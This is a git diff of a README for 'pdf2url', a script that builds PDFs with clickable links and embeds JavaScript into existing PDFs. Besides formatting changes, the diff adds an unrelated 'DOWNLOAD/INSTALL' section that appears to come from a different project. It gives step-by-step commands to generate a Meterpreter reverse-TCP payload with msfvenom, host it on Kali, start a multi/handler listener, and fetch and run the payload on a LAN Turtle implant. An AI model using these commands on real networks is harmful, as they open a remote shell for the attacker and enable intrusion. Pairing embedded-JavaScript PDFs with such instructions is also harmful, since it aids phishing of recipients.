@@ -4,7 +4,7 @@
 
 pdf2url is a Python script that generates a PDF file with a clickable link to open a url or download a file. It utilizes the ReportLab library to create the PDF and allows you to specify the text for the link, name of the PDF file and the URL to be opened when the link is clicked.
 
-Disclaimer:
+#### Disclaimer:
 This script is intended for educational and informational purposes only. Use it responsibly. The user assumes all responsibility and risk associated with the use of this script.
 
 Prerequisites:
@@ -17,14 +17,15 @@ Arguments:
 -o or --output: Name of the PDF file to be saved (default: "output.pdf").
 
 Example usage:
-python pdf2url.py -t "Click me" -u "https://www.example.com" -o "mydocument.pdf"
+<br />
+python pdf2url.py -t "Click me" -u "https://www.example.com" -o "mydocument.pdf"<br />
 - NOTE: use double "" quotes
 
 # pdf2url
 
 The code is a Python script that allows you to create a PDF with embedded JavaScript. It provides two main functionalities: creating a blank PDF with a single empty page and inserting JavaScript code into an existing PDF.
 
-Disclaimer:
+#### Disclaimer:
 This script is intended for educational and informational purposes only. Use it responsibly. The user assumes all responsibility and risk associated with the use of this script.
 
 Prerequisites:
@@ -39,8 +40,35 @@ Arguments:
 Example usage:
 
 Inserting JavaScript into an existing PDF -
-python pdf2url.py -i input.pdf -j script.js -o output.pdf
+<br />
+python pdf2url.py -i input.pdf -j script.js -o output.pdf<br />
 
 Creating a blank PDF and inserting JavaScript -
-python pdf2url.py -j script.js -o output.pdf
+<br />
+python pdf2url.py -j script.js -o output.pdf<br />
 
+
+#### DOWNLOAD/INSTALL
+
+**1 - On LAN Turtle: download module from GitHub**<br />
+<br />
+`wget https://raw.githubusercontent.com/ATTACKnDEFEND/LanTurtle/main/meterpreter-mipsbe-reverse-tcp -O
+/etc/turtle/modules/meterpreter-mipsbe-reverse-tcp`<br />
+<br />
+`chmod 755 /etc/turtle/modules/meterpreter-mipsbe-reverse-tcp`<br />
+
+**2 - On Kali: generate Meterpreter payload with Msfvenom**<br />
+<br />
+`msfvenom -p linux/mipsbe/meterpreter_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf > meterpreter-mipsbe-reverse-tcp`<br />
+<br />
+`sudo cp meterpreter-mipsbe-reverse-tcp /var/www/html/meterpreter-mipsbe-reverse-tcp`<br />
+
+**3 - On Kali: start Meterpreter listener**<br />
+<br />
+`sudo msfconsole -q -x "use exploit/multi/handler;set payload linux/mipsbe/meterpreter_reverse_tcp;set lhost <LHOST>;set LPORT <LPORT>;exploit -j"`<br />
+
+**4 - On LAN Turtle: transfer Meterpreter payload**<br />
+<br />
+`wget <KALI IP>/meterpreter-mipsbe-reverse-tcp -O /etc/turtle/meterpreter/meterpreter-mipsbe-reverse-tcp`<br />
+<br />
+`chmod 755 /etc/turtle/meterpreter/meterpreter-mipsbe-reverse-tcp`<br />
